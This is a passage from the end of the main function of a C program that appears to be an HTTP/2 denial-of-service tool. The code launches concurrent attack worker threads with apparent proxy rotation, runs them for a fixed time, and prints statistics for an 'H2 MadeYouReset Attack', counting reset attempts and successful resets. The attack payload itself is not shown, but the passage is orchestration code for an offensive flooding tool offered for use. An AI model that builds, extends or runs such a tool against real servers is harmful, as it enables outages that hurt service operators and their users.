    pthread_create(&mon_thread, NULL, monitor_thread, &cfg);
    
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, stats_printer, &cfg);
    
    AttackConfig *configs = malloc(sizeof(AttackConfig) * cfg.concurrency);
    for (int i = 0; i < cfg.concurrency; i++) {
        memcpy(&configs[i], &cfg, sizeof(AttackConfig));
        pthread_create(&workers[i], NULL, worker_thread, &configs[i]);
    }
    
    sleep(cfg.duration_sec);
    running = false;
    
    for (int i = 0; i < cfg.concurrency; i++) {
        pthread_join(workers[i], NULL);
    }
    pthread_join(stats_thread, NULL);
    pthread_join(mon_thread, NULL);
    
    long long requests, responses, errors, reset_attempts, reset_success, total_lat;
    
    pthread_mutex_lock(&stats.mutex);
    requests = stats.requests;
    responses = stats.responses;
    errors = stats.errors;
    reset_attempts = stats.reset_attempts;
    reset_success = stats.reset_success;
    total_lat = stats.total_latency;
    pthread_mutex_unlock(&stats.mutex);
    
    double avg_rps = (double)requests / cfg.duration_sec;
    double avg_latency = responses > 0 ? (double)total_lat / responses : 0;
    double success_rate = requests > 0 ? (double)responses / requests * 100 : 0;
    
    printf("\n\n" COLOR_MAGENTA "========== FINAL STATISTICS ==========\n" COLOR_RESET);
    printf(COLOR_CYAN "Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_GREEN "Total Requests: %lld\n" COLOR_RESET, requests);
    printf(COLOR_YELLOW "Responses: %lld\n" COLOR_RESET, responses);
    printf(COLOR_RED "Errors: %lld\n" COLOR_RESET, errors);
    printf(COLOR_WHITE "Success Rate: %.2f%%\n" COLOR_RESET, success_rate);
    printf(COLOR_WHITE "Average RPS: %.2f\n" COLOR_RESET, avg_rps);
    printf(COLOR_WHITE "Average Latency: %.2fms\n" COLOR_RESET, avg_latency);
    printf(COLOR_MAGENTA "H2 MadeYouReset Attack:\n" COLOR_RESET);
    printf("  Attempts: %lld\n", reset_attempts);
    printf(COLOR_GREEN "  Successful Resets: %lld\n" COLOR_RESET, reset_success);
    printf(COLOR_RED "  Errors: %lld\n" COLOR_RESET, stats.reset_errors);
    printf(COLOR_MAGENTA "=====================================\n" COLOR_RESET);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    free(configs);
    curl_global_cleanup();
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}
